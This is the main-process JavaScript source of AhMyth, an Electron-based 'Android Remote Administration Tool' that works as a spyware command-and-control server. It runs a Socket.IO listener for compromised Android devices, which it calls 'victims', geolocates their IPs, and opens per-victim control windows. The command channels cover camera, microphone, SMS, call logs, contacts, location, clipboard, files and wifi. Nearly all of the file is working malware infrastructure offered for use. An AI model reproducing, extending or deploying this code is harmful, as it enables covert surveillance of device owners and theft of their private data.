const { app, BrowserWindow, dialog, systemPreferences } = require('electron')
const electron = require('electron');
const { ipcMain } = require('electron');
var io = require('socket.io');
var geoip = require('geoip-lite');
var fs = require('fs');
var path = require('path');
var victimsList = require('./app/assets/js/model/Victim');
module.exports = victimsList;

//--------------------------------------------------------------
let win;
let display;
var windows = {};
const IOs = {};
const AUTO_LISTEN_PORT = process.env.AHMYTH_AUTO_LISTEN_PORT
  ? parseInt(process.env.AHMYTH_AUTO_LISTEN_PORT, 10)
  : null;
//--------------------------------------------------------------

// Log file setup
const logDir = path.join(app.getPath('userData'), 'logs');
if (!fs.existsSync(logDir)) {
  fs.mkdirSync(logDir, { recursive: true });
}
const logFile = path.join(logDir, `ahmyth-${new Date().toISOString().split('T')[0]}.log`);

// Write to log file
function writeToLogFile(level, msg) {
  const timestamp = new Date().toISOString();
  const logEntry = `[${timestamp}] [${level}] ${msg}\n`;
  fs.appendFileSync(logFile, logEntry);
}

// Logging utility for main process (console + file)
const log = {
  info: (msg) => {
    console.log(`[AhMyth] [INFO] ${new Date().toISOString()} - ${msg}`);
    writeToLogFile('INFO', msg);
  },
  success: (msg) => {
    console.log(`[AhMyth] [SUCCESS] ${new Date().toISOString()} - ${msg}`);
    writeToLogFile('SUCCESS', msg);
  },
  error: (msg) => {
    console.error(`[AhMyth] [ERROR] ${new Date().toISOString()} - ${msg}`);
    writeToLogFile('ERROR', msg);
  },
  warn: (msg) => {
    console.warn(`[AhMyth] [WARN] ${new Date().toISOString()} - ${msg}`);
    writeToLogFile('WARN', msg);
  },
  request: (deviceId, command, data) => {
    const msg = `REQUEST to ${deviceId}: ${command} ${data ? JSON.stringify(data).substring(0, 500) : ''}`;
    console.log(`[AhMyth] [REQUEST] ${new Date().toISOString()} - ${msg}`);
    writeToLogFile('REQUEST', msg);
  },
  response: (deviceId, command, data) => {
    const dataStr = data ? JSON.stringify(data) : '';
    const truncated = dataStr.length > 1000 ? dataStr.substring(0, 1000) + '...[truncated]' : dataStr;
    const msg = `RESPONSE from ${deviceId}: ${command} (${dataStr.length} bytes) ${truncated}`;
    console.log(`[AhMyth] [RESPONSE] ${new Date().toISOString()} - ${msg}`);
    writeToLogFile('RESPONSE', msg);
  }
};

// Check system permissions on startup
async function checkSystemPermissions() {
  log.info('Checking system permissions...');
  
  const permissions = [];
  
  // Check microphone access (for future features)
  if (process.platform === 'darwin') {
    const micStatus = systemPreferences.getMediaAccessStatus('microphone');
    permissions.push({ name: 'Microphone', status: micStatus });
    
    const cameraStatus = systemPreferences.getMediaAccessStatus('camera');
    permissions.push({ name: 'Camera', status: cameraStatus });
    
    if (micStatus === 'not-determined') {
      log.info('Requesting microphone permission...');
      await systemPreferences.askForMediaAccess('microphone');
    }
    
    if (cameraStatus === 'not-determined') {
      log.info('Requesting camera permission...');
      await systemPreferences.askForMediaAccess('camera');
    }
  }
  
  // Check network permissions
  log.info('Network permissions: granted (required for socket connections)');
  permissions.push({ name: 'Network', status: 'granted' });
  
  // Check file system permissions
  log.info('File system permissions: granted (required for APK building)');
  permissions.push({ name: 'File System', status: 'granted' });
  
  log.success('Permission check completed');
  return permissions;
}

// Display startup information
function displayStartupInfo() {
  console.log('\n');
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║                                                              ║');
  console.log('║     █████╗ ██╗  ██╗███╗   ███╗██╗   ██╗████████╗██╗  ██╗    ║');
  console.log('║    ██╔══██╗██║  ██║████╗ ████║╚██╗ ██╔╝╚══██╔══╝██║  ██║    ║');
  console.log('║    ███████║███████║██╔████╔██║ ╚████╔╝    ██║   ███████║    ║');
  console.log('║    ██╔══██║██╔══██║██║╚██╔╝██║  ╚██╔╝     ██║   ██╔══██║    ║');
  console.log('║    ██║  ██║██║  ██║██║ ╚═╝ ██║   ██║      ██║   ██║  ██║    ║');
  console.log('║    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝    ║');
  console.log('║                                                              ║');
  console.log('║              Android Remote Administration Tool              ║');
  console.log('║                         Version 2.5                          ║');
  console.log('║                                                              ║');
  console.log('╚══════════════════════════════════════════════════════════════╝');
  console.log('\n');
  log.info(`Platform: ${process.platform}`);
  log.info(`Architecture: ${process.arch}`);
  log.info(`Electron Version: ${process.versions.electron}`);
  log.info(`Node Version: ${process.versions.node}`);
  console.log('\n');
}

function createWindow() {
  displayStartupInfo();

  // get Display Sizes ( x , y , width , height)
  display = electron.screen.getPrimaryDisplay();
  log.info(`Display size: ${display.bounds.width}x${display.bounds.height}`);

  //------------------------SPLASH SCREEN INIT------------------------------------
  // create the splash window
  let splashWin = new BrowserWindow({
    width: 700,
    height: 500,
    frame: false,
    transparent: true,
    icon: __dirname + '/app/assets/img/icon.png',
    type: "splash",
    alwaysOnTop: true,
    show: false,
    position: "center",
    resizable: false,
    toolbar: false,
    fullscreen: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false
    }
  });

  log.info('Loading splash screen...');
  splashWin.loadFile(__dirname + '/app/splash.html');

  splashWin.webContents.on('did-finish-load', function () {
    splashWin.show();
    log.success('Splash screen displayed');
  });

  splashWin.on('closed', () => {
    splashWin = null
  })


  //------------------------Main SCREEN INIT------------------------------------
  // Create the browser window.
  win = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    width: 1100,
    height: 750,
    minWidth: 900,
    minHeight: 650,
    show: false,
    resizable: true,
    position: "center",
    toolbar: false,
    fullscreen: false,
    frame: false,
    backgroundColor: '#0d1117',
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false
    }
  });

  log.info('Loading main window...');
  win.loadFile(__dirname + '/app/index.html');
  
  // Uncomment to open dev tools for debugging
  // win.webContents.openDevTools()

  win.on('closed', () => {
    log.info('Main window closed');
    win = null
  })

  // Emitted when the window is finished loading.
  win.webContents.on('did-finish-load', async function () {
    log.success('Main window loaded');
    
    // Check permissions
    await checkSystemPermissions();
    
    setTimeout(() => {
      if (splashWin) {
        splashWin.close();
      }
      win.show();
      log.success('Application ready');

      // Optional auto-start of the Socket.IO server for headless automation
      maybeAutoStartSocketServer();
    }, 2000);
  });
}



// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
app.on('ready', () => {
  log.info('Electron app ready');
  createWindow();
})

// Quit when all windows are closed.
app.on('window-all-closed', () => {
  log.info('All windows closed');
  if (process.platform !== 'darwin') {
    app.quit()
  }
})

app.on('activate', () => {
  if (win === null) {
    createWindow()
  }
})



//handle the Uncaught Exceptions




const listeningStatus = {}; // Object to track listening status for each port

function maybeAutoStartSocketServer() {
  if (!AUTO_LISTEN_PORT || Number.isNaN(AUTO_LISTEN_PORT)) {
    return;
  }

  if (listeningStatus[AUTO_LISTEN_PORT]) {
    log.info(`[AUTO LISTEN] Socket.IO already active on port ${AUTO_LISTEN_PORT}`);
    return;
  }

  log.info(`[AUTO LISTEN] Starting Socket.IO server on port ${AUTO_LISTEN_PORT}`);
  const autoEvent = {
    reply: (channel, message) => {
      log.info(`[AUTO LISTEN] ${channel}: ${message}`);
    }
  };

  ipcMain.emit('SocketIO:Listen', autoEvent, AUTO_LISTEN_PORT);
}

ipcMain.on('SocketIO:Listen', function (event, port) {
  log.info(`Attempting to start server on port ${port}...`);
  
  if (listeningStatus[port]) {
    log.warn(`Port ${port} is already in use`);
    event.reply('SocketIO:ListenError', `[✗] Already listening on port ${port}`);
    return;
  }

  try {
    // Socket.IO v4 initialization
    IOs[port] = require('socket.io')(port, {
      cors: {
        origin: "*",
        methods: ["GET", "POST"]
      },
      pingInterval: 25000,
      pingTimeout: 20000,
      connectTimeout: 45000,
      maxHttpBufferSize: 1e8, // 100 MB
      allowEIO3: true // Allow Engine.IO v3 clients (like Android socket.io-client 1.x/2.x)
    });

    log.success(`Server started on port ${port}`);

    IOs[port].sockets.on('connection', function (socket) {
      var address = socket.request.connection;
      var query = socket.handshake.query;
      var index = query.id;
      var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
      var country = null;
      
      // Check if it's a local/private IP
      const isLocalIP = ip === '127.0.0.1' || 
                        ip === 'localhost' ||
                        ip.startsWith('10.') || 
                        ip.startsWith('192.168.') || 
                        ip.startsWith('172.16.') ||
                        ip.startsWith('172.17.') ||
                        ip.startsWith('172.18.') ||
                        ip.startsWith('172.19.') ||
                        ip.startsWith('172.2') ||
                        ip.startsWith('172.3');
      
      if (isLocalIP) {
        log.info(`Local/private IP detected: ${ip} - GeoIP not applicable`);
        country = null; // Will show globe icon
      } else {
        var geo = geoip.lookup(ip);
        if (geo) {
          country = geo.country.toLowerCase();
          log.info(`GeoIP lookup: ${ip} -> ${geo.country} (${geo.city || 'Unknown city'})`);
        } else {
          log.warn(`GeoIP lookup failed for IP: ${ip}`);
        }
      }

      log.success(`New connection from ${ip}:${address.remotePort}`);
      log.info(`Device: ${query.manf} ${query.model} (Android ${query.release})`);
      log.info(`Device ID: ${query.id}`);

      // Check if device already exists, and if so, disconnect the old socket
      const existingVictim = victimsList.getVictim(index);
      if (existingVictim && existingVictim.socket) {
        log.warn(`Device ${index} is reconnecting. Disconnecting old socket.`);
        existingVictim.socket.disconnect(true); // Force disconnect
        victimsList.rmVictim(index); // Remove old entry
      }

      // Add the victim to victimList
      victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);


      //------------------------Notification SCREEN INIT------------------------------------
      // create the Notification window
      let notification = new BrowserWindow({
        frame: false,
        x: display.bounds.width - 320,
        y: display.bounds.height - 100,
        show: false,
        width: 300,
        height: 80,
        resizable: false,
        toolbar: false,
        alwaysOnTop: true,
        skipTaskbar: true,
        transparent: true,
        webPreferences: {
          nodeIntegration: true,
          enableRemoteModule: true,
          contextIsolation: false
        }
      });

      // Emitted when the window is finished loading.
      notification.webContents.on('did-finish-load', function () {
        notification.show();
        setTimeout(function () {
          if (notification && !notification.isDestroyed()) {
            notification.destroy()
          }
        }, 3000);
      });

      notification.webContents.victim = victimsList.getVictim(index);
      notification.loadFile(__dirname + '/app/notification.html');



      //notify renderer proccess (AppCtrl) about the new Victim
      win.webContents.send('SocketIO:NewVictim', index);

      socket.on('disconnect', function () {
        log.info(`Victim disconnected: ${ip} (${query.manf} ${query.model})`);
        
        // Decrease the socket count on a disconnect
        victimsList.rmVictim(index);

        //notify renderer proccess (AppCtrl) about the disconnected Victim
        win.webContents.send('SocketIO:RemoveVictim', index);

        if (windows[index]) {
          try {
            const labWindow = BrowserWindow.fromId(windows[index]);
            if (labWindow && !labWindow.isDestroyed()) {
              labWindow.webContents.send("SocketIO:VictimDisconnected");
            }
          } catch (e) {
            log.error(`Error notifying lab window: ${e.message}`);
          }
          delete windows[index]
        }

        //notify renderer proccess (LabCtrl) if opened about the Server Disconnecting
        if (windows[index]) {
          try {
            const labWindow = BrowserWindow.fromId(windows[index]);
            if (labWindow && !labWindow.isDestroyed()) {
              labWindow.webContents.send("SocketIO:ServerDisconnected");
            }
          } catch (e) {
            log.error(`Error notifying lab window: ${e.message}`);
          }
          delete windows[index]
        }
      });
    });

    event.reply('SocketIO:Listen', `[✓] Server started on port ${port}`);
    listeningStatus[port] = true;
    
  } catch (error) {
    log.error(`Failed to start server: ${error.message}`);
    event.reply('SocketIO:ListenError', `[✗] Failed to start server: ${error.message}`);
  }
});

ipcMain.on('SocketIO:Stop', function (event, port) {
  log.info(`Stopping server on port ${port}...`);
  
  if (IOs[port]) {
    try {
      IOs[port].close();
      IOs[port] = null;
      listeningStatus[port] = false;
      log.success(`Server stopped on port ${port}`);
      event.reply('SocketIO:Stop', `[✓] Server stopped on port ${port}`);
    } catch (error) {
      log.error(`Error stopping server: ${error.message}`);
      event.reply('SocketIO:StopError', `[✗] Error stopping server: ${error.message}`);
    }
  } else {
    log.warn(`No server running on port ${port}`);
    event.reply('SocketIO:StopError', `[✗] No server running on port ${port}`);
  }
});

process.on('uncaughtException', function (error) {
  log.error(`Uncaught exception: ${error.message}`);
  log.error(error.stack);
  
  if (error.code == "EADDRINUSE") {
    if (win && win.webContents) {
      win.webContents.send('SocketIO:ListenError', "[✗] Port is already in use");
    }
  } else {
    if (electron && electron.dialog) {
      electron.dialog.showErrorBox("AhMyth Error", `An unexpected error occurred:\n\n${error.message}`);
    }
  }
});

// Handle window control IPC messages as fallback for when remote module doesn't work
ipcMain.on('window-close', (event) => {
  log.info('Window close requested');
  if (win) {
    win.close();
  }
});

ipcMain.on('window-minimize', (event) => {
  if (win) {
    win.minimize();
  }
});

ipcMain.on('window-maximize', (event) => {
  if (win) {
    if (win.isMaximized()) {
      win.unmaximize();
    } else {
      win.maximize();
    }
  }
});

// Fired when Victim's Lab is opened
ipcMain.on('openLabWindow', function (e, page, index) {
  log.info(`Opening lab window for victim: ${index}`);
  
  //------------------------Lab SCREEN INIT------------------------------------
  // create the Lab window
  let child = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    parent: win,
    width: 850,
    height: 800,
    minWidth: 700,
    minHeight: 600,
    show: false,
    darkTheme: true,
    resizable: true,
    frame: false,
    backgroundColor: '#0d1117',
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false
    }
  })

  //add this window to windowsList
  windows[index] = child.id;
  
  // Uncomment to debug lab window
  // child.webContents.openDevTools();

  // pass the victim info to this victim lab with logging wrapper
  const originalSocket = victimsList.getVictim(index).socket;
  const victimId = index;
  
  // Wrap socket to add logging for all emits
  const originalEmit = originalSocket.emit.bind(originalSocket);
  originalSocket.emit = function(event, data) {
    log.request(victimId, event, data);
    return originalEmit(event, data);
  };
  
  // Wrap socket to add logging for all received events
  const originalOn = originalSocket.on.bind(originalSocket);
  originalSocket.on = function(event, callback) {
    return originalOn(event, function(data) {
      log.response(victimId, event, data);
      callback(data);
    });
  };
  
  child.webContents.victim = originalSocket;
  child.loadFile(__dirname + '/app/' + page)

  child.once('ready-to-show', () => {
    child.show();
    log.success(`Lab window opened for victim: ${index}`);
  });

  child.on('closed', () => {
    log.info(`Lab window closed for victim: ${index}`);
    delete windows[index];
    
    //on lab window closed remove all socket listners
    const victim = victimsList.getVictim(index);
    if (victim && victim.socket) {
      victim.socket.removeAllListeners("x0000ca"); // camera
      victim.socket.removeAllListeners("x0000fm"); // file manager
      victim.socket.removeAllListeners("x0000sm"); // sms
      victim.socket.removeAllListeners("x0000cl"); // call logs
      victim.socket.removeAllListeners("x0000cn"); // contacts
      victim.socket.removeAllListeners("x0000mc"); // mic
      victim.socket.removeAllListeners("x0000lm"); // location
      victim.socket.removeAllListeners("x0000di"); // device info
      victim.socket.removeAllListeners("x0000ap"); // apps
      victim.socket.removeAllListeners("x0000cb"); // clipboard
      victim.socket.removeAllListeners("x0000wf"); // wifi
      log.info('All socket listeners removed');
    }
  })
});
